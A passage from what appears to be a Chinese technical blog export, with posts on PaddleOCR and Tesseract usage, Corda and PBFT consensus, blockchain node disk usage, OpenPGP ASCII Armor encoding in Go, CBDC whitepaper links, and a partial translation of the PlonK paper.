<h2 id="中文OCR模型快速使用"><a href="#中文OCR模型快速使用" class="headerlink" title="中文OCR模型快速使用"></a>中文OCR模型快速使用</h2><p>以超轻量级模型为例：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mkdir inference &amp;&amp; cd inference</span><br><span class="line"># 下载超轻量级中文OCR模型的检测模型并解压</span><br><span class="line">wget https:&#x2F;&#x2F;paddleocr.bj.bcebos.com&#x2F;ch_models&#x2F;ch_det_mv3_db_infer.tar &amp;&amp; tar xf ch_det_mv3_db_infer.tar</span><br><span class="line"># 下载超轻量级中文OCR模型的识别模型并解压</span><br><span class="line">wget https:&#x2F;&#x2F;paddleocr.bj.bcebos.com&#x2F;ch_models&#x2F;ch_rec_mv3_crnn_infer.tar &amp;&amp; tar xf ch_rec_mv3_crnn_infer.tar</span><br><span class="line">cd ..</span><br></pre></td></tr></table></figure>

<p>解压完毕后应有如下文件结构：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">|-inference</span><br><span class="line">    |-ch_rec_mv3_crnn</span><br><span class="line">        |- model</span><br><span class="line">        |- params</span><br><span class="line">    |-ch_det_mv3_db</span><br><span class="line">        |- model</span><br><span class="line">        |- params</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>

<h2 id="单张图像或者图像集合预测"><a href="#单张图像或者图像集合预测" class="headerlink" title="单张图像或者图像集合预测"></a>单张图像或者图像集合预测</h2><p>以下代码实现了文本检测、识别串联推理，在执行预测时，需要通过参数image_dir指定单张图像或者图像集合的路径、参数det_model_dir指定检测inference模型的路径和参数rec_model_dir指定识别inference模型的路径。可视化识别结果默认保存到 ./inference_results 文件夹里面。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 预测image_dir指定的单张图像</span></span><br><span class="line">python3 tools/infer/predict_system.py --image_dir=<span class="string">&quot;./doc/imgs/11.jpg&quot;</span> --det_model_dir=<span class="string">&quot;./inference/ch_det_mv3_db/&quot;</span>  --rec_model_dir=<span class="string">&quot;./inference/ch_rec_mv3_crnn/&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 预测image_dir指定的图像集合</span></span><br><span class="line">python3 tools/infer/predict_system.py --image_dir=<span class="string">&quot;./doc/imgs/&quot;</span> --det_model_dir=<span class="string">&quot;./inference/ch_det_mv3_db/&quot;</span>  --rec_model_dir=<span class="string">&quot;./inference/ch_rec_mv3_crnn/&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果想使用CPU进行预测，需设置use_gpu参数为False</span></span><br><span class="line">python3 tools/infer/predict_system.py --image_dir=<span class="string">&quot;./doc/imgs/11.jpg&quot;</span> --det_model_dir=<span class="string">&quot;./inference/ch_det_mv3_db/&quot;</span>  --rec_model_dir=<span class="string">&quot;./inference/ch_rec_mv3_crnn/&quot;</span> --use_gpu=False</span><br></pre></td></tr></table></figure>

<ul>
<li>通用中文OCR模型</li>
</ul>
<p>请按照上述步骤下载相应的模型，并且更新相关的参数，示例如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 预测image_dir指定的单张图像</span><br><span class="line">python3 tools&#x2F;infer&#x2F;predict_system.py --image_dir&#x3D;&quot;.&#x2F;doc&#x2F;imgs&#x2F;11.jpg&quot; --det_model_dir&#x3D;&quot;.&#x2F;inference&#x2F;ch_det_r50_vd_db&#x2F;&quot;  --rec_model_dir&#x3D;&quot;.&#x2F;inference&#x2F;ch_rec_r34_vd_crnn&#x2F;&quot;</span><br></pre></td></tr></table></figure>

<ul>
<li>支持空格的通用中文OCR模型</li>
</ul>
<p>请按照上述步骤下载相应的模型，并且更新相关的参数，示例如下：</p>
<p>*注意：请将代码更新到最新版本，并添加参数 <code>--use_space_char=True</code> *</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 预测image_dir指定的单张图像</span><br><span class="line">python3 tools&#x2F;infer&#x2F;predict_system.py --image_dir&#x3D;&quot;.&#x2F;doc&#x2F;imgs_en&#x2F;img_12.jpg&quot; --det_model_dir&#x3D;&quot;.&#x2F;inference&#x2F;ch_det_r50_vd_db&#x2F;&quot;  --rec_model_dir&#x3D;&quot;.&#x2F;inference&#x2F;ch_rec_r34_vd_crnn_enhance&#x2F;&quot; --use_space_char&#x3D;True</span><br></pre></td></tr></table></figure>

<p>更多的文本检测、识别串联推理使用方式请参考文档教程中<a href="./inference.md">基于Python预测引擎推理</a>。</p>
<p>此外，文档教程中也提供了中文OCR模型的其他预测部署方式：</p>
<ul>
<li><a href="../../deploy/cpp_infer/readme.md">基于C++预测引擎推理</a></li>
<li><a href="./serving.md">服务部署</a></li>
<li><a href="../../deploy/lite/readme.md">端侧部署</a></li>
</ul>
]]></content>
      <tags>
        <tag>OCR</tag>
      </tags>
  </entry>
  <entry>
    <title>OCR和tesseract项目</title>
    <url>/2018/12/28/OCR%E5%92%8Ctesseract%E9%A1%B9%E7%9B%AE/</url>
    <content><![CDATA[<h3 id="什么是OCR？"><a href="#什么是OCR？" class="headerlink" title="什么是OCR？"></a>什么是OCR？</h3><p>OCR（Optical Character Recognition，光学字符识别），针对印刷体字符，采用光学的方式将纸质文档中的文字转换成为黑白点阵的图像文件，并通过识别软件将图像中的文字转换成文本格式，供文字处理软件进一步编辑加工的技术。</p>
<h3 id="什么是tesseract？"><a href="#什么是tesseract？" class="headerlink" title="什么是tesseract？"></a>什么是tesseract？</h3><p>谈到OCR就一定要首先聊聊<a href="https://github.com/tesseract-ocr/tesseract">tesseract</a>。<a href="https://github.com/tesseract-ocr/tesseract">tesseract</a>的OCR引擎。最先由HP实验室于1985年开始研发，至1995年时已经成为OCR业内最准确的三款识别引擎之一。然而，HP不久便决定放弃OCR业务，Tesseract也从此尘封。</p>
<p>数年以后，HP意识到，与其将Tesseract束之高阁，不如贡献给开源软件业，让其重焕新生－－2005年，Tesseract由美国内华达州信息技术研究所获得，并求诸于Google对Tesseract进行改进、消除Bug、优化工作。目前已作为开源项目发布，大部分的开发人员均来自于Google。</p>
<p><a href="https://github.com/tesseract-ocr/tesseract/releases/tag/4.0.0">目前最新版本是4.0（Oct 29 2018）</a>。4.0版本主要增加了新的基于LSTM神经网络的引擎，识别率和正确率得到提高。</p>
<blockquote>
<ul>
<li>添加了一个新的OCR引擎，该引擎使用基于LSTM的神经网络系统，具有很高的准确性。</li>
<li>这包括LSTM OCR引擎的新的训练工具。可以从头开始或通过微调现有模型来训练新模型。</li>
<li>添加了经过训练的数据，其中包括多种语言的LSTM模型。</li>
</ul>
</blockquote>
<h3 id="tesseract的相关库"><a href="#tesseract的相关库" class="headerlink" title="tesseract的相关库"></a>tesseract的相关库</h3><ul>
<li><a href="https://github.com/madmaze/pytesseract">pytesseract</a></li>
</ul>
<p><a href="https://github.com/madmaze/pytesseract">Python-tesseract</a>是tesseract-OCR引擎的Python包装器。 它作为独立的调用脚本也很有用，因为它可以读取Python Imaging Library支持的所有图像类型，包括jpeg，png，gif，bmp，tiff等，而tesseract-ocr默认只支持 tiff 和 bmp。此外，如果用作脚本，Python-tesseract也可以将已识别的文本直接打印出来。</p>
<ul>
<li><a href="https://github.com/naptha/tesseract.js">tesseract.js</a></li>
</ul>
<p><a href="https://github.com/naptha/tesseract.js">tesseract.js</a>是tesseract-OCR引擎的JavaScript库器。通过npm安装</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm install tesseract.js --save</span><br></pre></td></tr></table></figure>

<h3 id="tesseract的相应软件"><a href="#tesseract的相应软件" class="headerlink" title="tesseract的相应软件"></a>tesseract的相应软件</h3><p><a href="https://github.com/manisandro/gImageReader">gImageReader</a>：A Gtk/Qt front-end to tesseract-ocr.</p>
<p><a href="https://github.com/OpaitSoftware/TesseractStudio.Net">TesseractStudio.Net</a>：A free Windows graphical interface to the Tesseract 4.0 OCR engine.</p>
<p>待续其他：</p>
<ul>
<li>tesseract中LSTM的具体分析；</li>
<li>tesseract如何使用；</li>
<li>pytesseract如何使用；</li>
<li>tesseract使用的正确率测试</li>
</ul>
<h3 id="关于tesseract的训练介绍"><a href="#关于tesseract的训练介绍" class="headerlink" title="关于tesseract的训练介绍"></a>关于tesseract的训练介绍</h3><ul>
<li><a href="https://github.com/tesseract-ocr/tesseract/wiki/TrainingTesseract-4.00">https://github.com/tesseract-ocr/tesseract/wiki/TrainingTesseract-4.00</a><ul>
<li>GPU, no support</li>
<li>very long time depend on fonts</li>
</ul>
</li>
</ul>
]]></content>
      <tags>
        <tag>OCR</tag>
      </tags>
  </entry>
  <entry>
    <title>Corda的共识机制</title>
    <url>/2023/07/17/Corda%E7%9A%84%E5%85%B1%E8%AF%86%E6%9C%BA%E5%88%B6/</url>
    <content><![CDATA[<h3 id="Corda的共识容错能力较弱"><a href="#Corda的共识容错能力较弱" class="headerlink" title="Corda的共识容错能力较弱"></a>Corda的共识容错能力较弱</h3><p>Version 1～5，Corda会分享交易直接相关的前一笔交易信息，可以<strong>防止</strong>的错误包括：</p>
<ol>
<li>前一笔交易的签名错误；</li>
<li>前一笔交易的金额错误；</li>
</ol>
<p><strong>不能够</strong>发现的错误包括：</p>
<ol>
<li>前一笔交易双方共同伪造交易，用以欺骗第三方；</li>
<li>间隔多笔的伪造交易，用以欺骗第三方；</li>
<li>交易的排序由Kafka决定，或者如ABC均提出向D购买某资产，D可以不按照合约逻辑，或者时间顺序，而是按照D在规则外的某种喜好，来完成交易，进而欺骗其他参与方。</li>
</ol>
<p>可能发生的效率问题：</p>
<ol>
<li>如若某节点在接收到某交易时，想校验其前序交易，不仅仅是前一个交易，而是全部的前序交易，首先是及其困难的，而且随着链的增高，其校验时间也在升高。</li>
<li>即使增加校验节点，但并不能够解决上述问题。另外，校验节点的可信性，效率等都成为新的系统问题。</li>
</ol>
<p>综上，针对需要区块链的共识机制来增强信任的场景，Corda不是一个好的选择。但是，如果在无需算法来建立信任（如工农中建四大行的某种资产交易系统，他们相互之间的欺诈风险非常低），而是需要某种账本系统，来减少对账摩擦的话，Corda可以帮助到企业，完成分别记账的任务。</p>
<p>参考：如上，多年的困惑，得到Corda的指导和确认，感谢。</p>
]]></content>
      <tags>
        <tag>共识算法</tag>
      </tags>
  </entry>
  <entry>
    <title>Odys实际运行占用磁盘情况</title>
    <url>/2019/12/20/Odyssey%E5%AE%9E%E9%99%85%E8%BF%90%E8%A1%8C%E5%8D%A0%E7%94%A8%E7%A3%81%E7%9B%98%E6%83%85%E5%86%B5%E4%BB%8B%E7%BB%8D/</url>
    <content><![CDATA[<p>2019-12-20，版本1.0.4，块高89万+（约59万笔交易）</p>
<p>==========================================================</p>
<p>run 25G</p>
<p>|</p>
<p>consus.log    526M</p>
<p>logs                4.6G</p>
<p>odys.log        16M</p>
<p><strong>data                19G</strong></p>
<p>|</p>
<p>config            32K</p>
<p><strong>data                2.7G</strong> — blockstore.db        1.4G    /    cs.wal    1G    /    state.db    21M    /    tx.index    308M</p>
<p><strong>odyssey        17G</strong></p>
<p>|</p>
<p><strong>chaindata    17G — 平均每个文件2.1M，共计97224个文件，其中 ancient 472M</strong></p>
<p>==========================================================</p>
<p>某项目中，2019年11月29日上线起始，截至2020年6月19日为止。用户量逐渐增大，目前的日活用户数量为10000~60000。区块高度为6,000,000以上，单个节点的磁盘用量为300G，日新增存储量为1.5G。</p>
<p>==========================================================</p>
<p>BTW：在ethereum1.9.9的版本中，geth 增加了 inspect 命令，“Inspect the storage size for each type of data in the database” ，详细情况将在下一篇文章中介绍。</p>
]]></content>
      <tags>
        <tag>Infrastructure</tag>
      </tags>
  </entry>
  <entry>
    <title>MAS-CBDC-Technical-Whitepaper</title>
    <url>/2023/08/07/MAS-CBDC-Technical-Whitepaper/</url>
    <content><![CDATA[<h3 id="The-best-of-CBDC-technical-whitepaper"><a href="#The-best-of-CBDC-technical-whitepaper" class="headerlink" title="The best of CBDC technical whitepaper"></a>The best of CBDC technical whitepaper</h3><ul>
<li><p><a href="https://www.mas.gov.sg/-/media/mas-media-library/development/fintech/pbm/pbm-technical-whitepaper.pdf">https://www.mas.gov.sg/-/media/mas-media-library/development/fintech/pbm/pbm-technical-whitepaper.pdf</a>  ( or local downlink here ==&gt;   <a href="https://github.com/willzhuang/WillZhuang.github.io/blob/master/2023/08/07/MAS-CBDC-Technical-Whitepaper/PBM%20Technical%20Whitepaper.pdf">PBM Technical Whitepaper.pdf</a> )</p>
</li>
<li><p>The same topic report file on project view ==&gt; <a href="https://www.mas.gov.sg/-/media/mas-media-library/development/fintech/project-orchid/mas-project-orchid-report.pdf">https://www.mas.gov.sg/-/media/mas-media-library/development/fintech/project-orchid/mas-project-orchid-report.pdf</a>  ( or local downlink here ==&gt;   <a href="https://github.com/willzhuang/WillZhuang.github.io/blob/master/2023/08/07/MAS-CBDC-Technical-Whitepaper/MAS%20Project%20Orchid%20Report.pdf">MAS Project Orchid Report.pdf</a>  )</p>
</li>
<li><p><a href="https://drive.google.com/drive/folders/1lF7PlRbpyrNa5VO4heQbBX0ZvDVNcgXU?usp=sharing">Live Demo Videos from Singapore Fintech Festival 2022 1</a></p>
</li>
<li><p>EIP-7291: Purpose Bound Money ==&gt; <a href="https://ethereum-magicians.org/t/eip-7291-purpose-bound-money/14973/3">https://ethereum-magicians.org/t/eip-7291-purpose-bound-money/14973/3</a></p>
</li>
</ul>
]]></content>
      <tags>
        <tag>CBDC</tag>
      </tags>
  </entry>
  <entry>
    <title>OpenPGP Armor 编码介绍</title>
    <url>/2018/08/09/OpenPGP-Armor-%E7%BC%96%E7%A0%81%E4%BB%8B%E7%BB%8D/</url>
    <content><![CDATA[<h3 id="OpenPGP-Armor"><a href="#OpenPGP-Armor" class="headerlink" title="OpenPGP Armor"></a>OpenPGP Armor</h3><p>OpenPGP是使用最广泛的电子邮件加密标准。它由Internet工程任务组（IETF）的OpenPGP工作组定义为RFC 4880中的建议标准.OpenPGP最初源自由Phil Zimmermann创建的PGP软件。</p>
<p>虽然OpenPGP的主要目的是端到端加密电子邮件通信，但它也用于加密消息传递和其他用例，如密码管理器。</p>
<p>OpenPGP的加密消息，签名证书和密钥的基本描述是八位的字节流。为了通过不能保障安全的网络通道传输OpenPGP的二进制八位字节，需要编码为可打印的二进制字符。OpenPGP提供将原始8位二进制八位字节流转换为可打印ASCII字符流，称为Radix-64编码或ASCII Armor。</p>
<p>ASCII Armor是OpenPGP的可选功能。当OpenPGP将数据编码为ASCII Armor时，它会在Radix-64编码数据中放置特定的Header。OpenPGP可以使用ASCII Armor来保护原始二进制数据。OpenPGP通过使用Header告知用户在ASCII Armor中编码了什么类型的数据。</p>
<h3 id="ASCII-Armor的数据结构如下："><a href="#ASCII-Armor的数据结构如下：" class="headerlink" title="ASCII Armor的数据结构如下："></a>ASCII Armor的数据结构如下：</h3><ul>
<li>Armor标题行，匹配数据类型</li>
<li>Armor Headers</li>
<li>A Blank（零长度或仅包含空格） Line</li>
<li>The ASCII-Armored data</li>
<li>An Armor Checksum</li>
<li>The Armor Tail，取决于护甲标题线</li>
</ul>
<h3 id="具体示例："><a href="#具体示例：" class="headerlink" title="具体示例："></a>具体示例：</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-----BEGIN PGP MESSAGE-----</span><br><span class="line"></span><br><span class="line">Version: OpenPrivacy 0.99</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">yDgBO22WxBHv7O8X7O&#x2F;jygAEzol56iUKiXmV+XmpCtmpqQUKiQrFqclFqUDBovzSvBSFjNSiVHsuAA&#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line">&#x3D;njUN</span><br><span class="line"></span><br><span class="line">-----END PGP MESSAGE-----</span><br></pre></td></tr></table></figure>

<h3 id="golang-org-x-crypto-openpgp-armor-代码分析："><a href="#golang-org-x-crypto-openpgp-armor-代码分析：" class="headerlink" title="golang.org/x/crypto/openpgp/armor 代码分析："></a><a href="golang.org/x/crypto/openpgp/armor">golang.org/x/crypto/openpgp/armor</a> 代码分析：</h3><figure class="highlight golang"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Encode 返回一个 WriteCloser，它将对 写入的数据进行编码</span></span><br><span class="line"><span class="comment">// Encode returns a WriteCloser which will encode the data written to it in</span></span><br><span class="line"><span class="comment">// OpenPGP Armor.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Encode</span><span class="params">(out io.Writer, blockType <span class="keyword">string</span>, headers <span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">string</span>)</span> <span class="params">(w io.WriteCloser, err error)</span></span> &#123;</span><br><span class="line">	bType := []<span class="keyword">byte</span>(blockType)</span><br><span class="line">	err = writeSlices(out, armorStart, bType, armorEndOfLineOut)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> k, v := <span class="keyword">range</span> headers &#123;</span><br><span class="line">		err = writeSlices(out, []<span class="keyword">byte</span>(k), armorHeaderSep, []<span class="keyword">byte</span>(v), newline)</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	_, err = out.Write(newline)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	e := &amp;encoding&#123;</span><br><span class="line">		out:       out,</span><br><span class="line">		breaker:   newLineBreaker(out, <span class="number">64</span>),</span><br><span class="line">		crc:       crc24Init,</span><br><span class="line">		blockType: bType,</span><br><span class="line">	&#125;</span><br><span class="line">	e.b64 = base64.NewEncoder(base64.StdEncoding, e.breaker)</span><br><span class="line">	<span class="keyword">return</span> e, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight golang"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 将返回值进一步封装为字符串</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">EncodeArmor</span><span class="params">(blockType <span class="keyword">string</span>, headers <span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">string</span>, data []<span class="keyword">byte</span>)</span> <span class="title">string</span></span> &#123;</span><br><span class="line">	buf := <span class="built_in">new</span>(bytes.Buffer)</span><br><span class="line">	w, err := armor.Encode(buf, blockType, headers)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="built_in">panic</span>(fmt.Errorf(<span class="string">&quot;could not encode ascii armor: %s&quot;</span>, err))</span><br><span class="line">	&#125;</span><br><span class="line">	_, err = w.Write(data)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="built_in">panic</span>(fmt.Errorf(<span class="string">&quot;could not encode ascii armor: %s&quot;</span>, err))</span><br><span class="line">	&#125;</span><br><span class="line">	err = w.Close()</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="built_in">panic</span>(fmt.Errorf(<span class="string">&quot;could not encode ascii armor: %s&quot;</span>, err))</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> buf.String()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight golang"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 实际使用中将公钥导出为 ASCII Armor 格式</span></span><br><span class="line"><span class="comment">// ExportPubKey returns public keys in ASCII armored format.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">armorPubKeyBytes</span><span class="params">(bz []<span class="keyword">byte</span>)</span> <span class="title">string</span></span> &#123;</span><br><span class="line">	<span class="keyword">return</span> armorBytes(bz, blockTypePubKey)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">armorBytes</span><span class="params">(bz []<span class="keyword">byte</span>, blockType <span class="keyword">string</span>)</span> <span class="title">string</span></span> &#123;</span><br><span class="line">	header := <span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">string</span>&#123;</span><br><span class="line">		<span class="string">&quot;type&quot;</span>:    <span class="string">&quot;Info&quot;</span>,</span><br><span class="line">		<span class="string">&quot;version&quot;</span>: <span class="string">&quot;0.0.0&quot;</span>,</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> armor.EncodeArmor(blockType, header, bz)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">ExportPubKey</span><span class="params">(name <span class="keyword">string</span>)</span> <span class="params">(armor <span class="keyword">string</span>, err error)</span></span> &#123;</span><br><span class="line">	bz := Get(infoKey(name))</span><br><span class="line">	<span class="keyword">if</span> bz == <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="string">&quot;&quot;</span>, fmt.Errorf(<span class="string">&quot;no key to export with name %s&quot;</span>, name)</span><br><span class="line">	&#125;</span><br><span class="line">	info, err := readInfo(bz)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> armorPubKeyBytes(info.GetPubKey().Bytes()), <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在 CovalentChain 公钥、私钥的导入导出和传输等情况，使用 ASCII Armor 编码格式非常合适。另外，在私钥情况下，通常都需要在加密后，再进行编码处理。</p>
<p>参考链接：</p>
<ol>
<li><a href="https://tools.ietf.org/html/rfc4880">https://tools.ietf.org/html/rfc4880</a></li>
<li><a href="https://www.openpgp.org/">https://www.openpgp.org/</a></li>
<li><a href="golang.org/x/crypto/openpgp/armor">golang.org/x/crypto/openpgp/armor</a></li>
</ol>
]]></content>
      <tags>
        <tag>golang</tag>
      </tags>
  </entry>
  <entry>
    <title>PBFT协议为什么要求N&gt;3f+1</title>
    <url>/2018/05/25/PBFT%E5%8D%8F%E8%AE%AE%E4%B8%BA%E4%BB%80%E4%B9%88%E8%A6%81%E6%B1%82N-3f-1/</url>
    <content><![CDATA[<p>最坏的情况是：f个节点是有问题的，由于到达顺序的问题，有可能f个有问题的节点比正常的f个节点先返回消息，又要保证收到的正常的节点比有问题的节点多，所以需要满足N-f-f&gt;f =&gt; N&gt;3f，所以至少3f+1个节点。</p>
<p>为什么至少要2f个prepare (包括自己的pre-prepare共2f+1)。这是因为之前论证的，如果有f个fault 节点，那么节点总数至少是N=3f+1。简单说一下论证过程，假设总数N个节点，f个fault节点，那么必须接收到N-f个消息应答，才能够判断出结果(因为fault节点可能不发送应答)。N-f个应答中有f个可能是假的(fault节点发出的)，那么真实的是N-f-f，要求真实的应答大于假的应答，即N-f-f &gt; f ==&gt; N &gt; 3f。所以: N_min = 3f+1 所以在prepare和commit两个阶段必须收到2f+1(包括自己) 的应答消息，才能证明有f+1非fault节点发送了应答。(注意前提是非fault对于相同的消息，会产生相同的消息应答)那么这里也有个问题：就是接收2f+1个消息的时，判断是否一致，是否需要对比数据的的签名。我的看法是，如果2f+1个v，n都相同，d(m)只需要f+1相同就可以了。否则就共识失败了。</p>
]]></content>
      <tags>
        <tag>共识算法</tag>
      </tags>
  </entry>
  <entry>
    <title>Plonk-1-基于拉格朗日乘子法的排列以用于通用的非接触的零知识证明</title>
    <url>/2021/04/02/Plonk-1-%E5%9F%BA%E4%BA%8E%E6%8B%89%E6%A0%BC%E6%9C%97%E6%97%A5%E4%B9%98%E5%AD%90%E6%B3%95%E7%9A%84%E6%8E%92%E5%88%97%E4%BB%A5%E7%94%A8%E4%BA%8E%E9%80%9A%E7%94%A8%E7%9A%84%E9%9D%9E%E6%8E%A5%E8%A7%A6%E7%9A%84%E9%9B%B6%E7%9F%A5%E8%AF%86%E8%AF%81%E6%98%8E/</url>
    <content><![CDATA[<p>论文原文 ==&gt; <a href="https://eprint.iacr.org/2019/953.pdf">953.pdf (iacr.org)</a>，<a href="https://eprint.iacr.org/2019/953.pdf">PlonK: Permutations over Lagrange-bases for Oecumenical Noninteractive arguments of Knowledge</a></p>
<h3 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h3><p>​    利用可更新的通用结构化参考字符串的zk-SNARK构造消除了部署zk-SNARKs [GKM +]的主要障碍之一。 Maller等人的重要工作，[MBKM19]提出了Sonic-第一个具有实用性的zk-SNARK，具有完全简洁的验证，可用于带有这种SRS(structured reference string)的通用算术电路。但是，<a href="https://eprint.iacr.org/2019/601.pdf">支持完全简洁验证的Sonic版本</a>仍然需要相对较高的证明建造费用。 我们提出了一种具有完全简洁验证的通用SNARK结构，并且大大减少了证明方的运行时间（根据电路结构的不同，证明者的运行时间比完全简洁验证程序模式下的[MBKM19]少7.5-20倍）。与[MBKM19]类似，我们依赖于基于Bayer和Groth [BG12]的置换参数。但是，我们专注于“评估亚组而不是单项式系数”； 这样可以简化置换参数和算术化步骤。</p>
<h3 id="1-介绍"><a href="#1-介绍" class="headerlink" title="1.介绍"></a>1.介绍</h3><p>​    由于zk-SNARK的实际部署，以“通用和可更新”的方式构造结构化参考字符串（SRS）引起了人们的极大兴趣。这意味着相同的SRS可以用于有关一定范围内所有电路的陈述；并且在任何时间点，SRS都可以由新的参与方进行更新，因此，从健全到现在为止，所有更新者中只有一个方是诚实的。为简便起见，让我们将这种安装过程称为通用的zk-SNARK。</p>
<p>​    出于介绍的目的，让我们说用于电路可满足性的zk-SNARK完全简洁：<br>1.预处理1阶段/ SRS生成运行时间与电路规模是准线性的。<br>2.证明者的运行时间与电路规模是准线性的。<br>3.证明长度与电路规模是对数乘方关系。<br>4.验证程序的运行时间与电路规模是<a href="https://baike.baidu.com/item/%E5%A4%9A%E5%AF%B9%E6%95%B0%E5%87%BD%E6%95%B0">对数多项式关系</a>。</p>
<p>​    Maller等人[MBKM19]首次为电路可满足性构建了一个通用的，完全简洁的zkSNARK，称为Sonic。[MBKM19]还提供了Sonic的版本，该版本具有显着改善的证明程序运行时间，但仅以某种摊销意义上的有效验证为代价。</p>
<h4 id="1-1本文的结果"><a href="#1-1本文的结果" class="headerlink" title="1.1本文的结果"></a>1.1本文的结果</h4><p>​    在这项工作中，我们提供了一种通用的完全简洁的zk-SNARK，与完全简洁的Sonic相比，其证明者的运行时间大大缩短。</p>
<p>​    在较高的水平上，我们的改进源自与[BCC + 16]启发的[MBKM19]算术更直接的电路算术化。这与针对乘法子组的单变量评估而不是如[MBKM19]中的双变量多项式的系数的置换参数结合在一起。</p>
<p>​    简而言之，可乘子组有用的一个原因是，包括Sonic在内的几种协议都使用了基于Bayer和Groth [BG12]的置换参数。最终，在“大积论证”中，这简化为检查“相邻单项式”处的多项式系数之间的关系。我们观察到，如果我们将点x，g·x视为邻居，其中g是域**<em>F**</em>的乘法子群的生成器，检查这些点对处不同多项式之间的关系非常方便。</p>
<p>​    一个相关的改进是乘法子群与拉格朗日乘子法很好地相互作用。例如，假设*<strong>H**<em>⊂</em></strong>F*<strong>是n + 1阶的乘子群，且x∈**<em>H</em></strong>。在H \ {x}上消失并具有 f(x)=1 的n阶多项式 Lx 表格的稀疏表示：<br>$$<br>L_x(X)=\frac{C_x(X^{n+1}-1)}{X-x}<br>$$<br>对于恒定的 Cx，当根据多项式恒等构造有效可验证的[BG12]样式置换参数时，这是有帮助的。</p>
<h4 id="1-2效能分析"><a href="#1-2效能分析" class="headerlink" title="1.2效能分析"></a>1.2效能分析</h4><p>​    对于非通用SNARK和通用SNARK，我们将这项工作的性能与最新技术进行了比较。 在发布之时，唯一完全简洁的通用SNARK结构是<a href="https://eprint.iacr.org/2019/601.pdf">Sonic协议[MBKM19]</a>（完全简洁的版本）。 该协议要求证明者计算273n个G1组指数，其中n是乘法门的数量。在完全简洁的Sonic中，每条线只能以三种线性关系使用，要求添加“虚拟”乘法门以容纳多于三个加法门的线。乘法门计数的这种增加被计入证明者的计算估计中（有关详细信息，请参见[MBKM19]）。</p>
<p>​    我们的通用SNARK要求证明者计算6个多项式承诺，并结合两个开放证明以在随机挑战点评估多项式承诺。PlonK有两种“口味”，以适合用户的口味。通过将证明大小增加两个分组元素，证明者的总计算量可以减少约10％。多项式的组合度为 <code>9(n + a)</code>（更大的证明）或 <code>11(n + a)</code>（较小的证明，减少的检验器工作），其中n是乘法门的数量，a是加法门的数量。当前，最有效的，最简洁的SNARK构造是Groth的2016构造[Gro16]，它需要每个电路唯一的，不可更新的CRS。证明构造时间主要受 <code>3n+m</code> G1和 <code>n</code> G2组指数的支配，其中 <code>m</code>形式上是R1CS变量的数量，通常以n为界（为简单起见，本节的其余部分，读者可能会假设m = n） 。如果我们假设一个G2指数等于三个G1指数，则将产生<code>6n + m</code>个等价的G1组指数。</p>
<p>​    在这些SNARK算术之间进行直接比较需要一些公认的主观假设。在评估通用电路时，我们发现加法门的数量是乘法门的数量的2倍，但是在假设加法门为“自由”的情况下进行优化的电路（在基于[Gro16]的基于R1CS的系统中很常见）将给出更差的估计。</p>
<p>​    在一个极端情况下，对于不包含加法门而仅扇入2倍乘法门的电路，我们通用的SNARK证明要求的证明者工作量比[Gro16]高1.1倍，而证明者的工作量比Sonic少30倍。 如果<code>a = 2n</code>，则比率变为比[Gro16]高约2.25倍的证明者工作量，和比Sonic低约≈10倍。 如果<code>a = 5n</code>，则其工作量比[Gro16]大约3倍，而工作量则比Sonic少5倍。 我们应该注意，这些比较只是在比较所需的组幂运算数。</p>
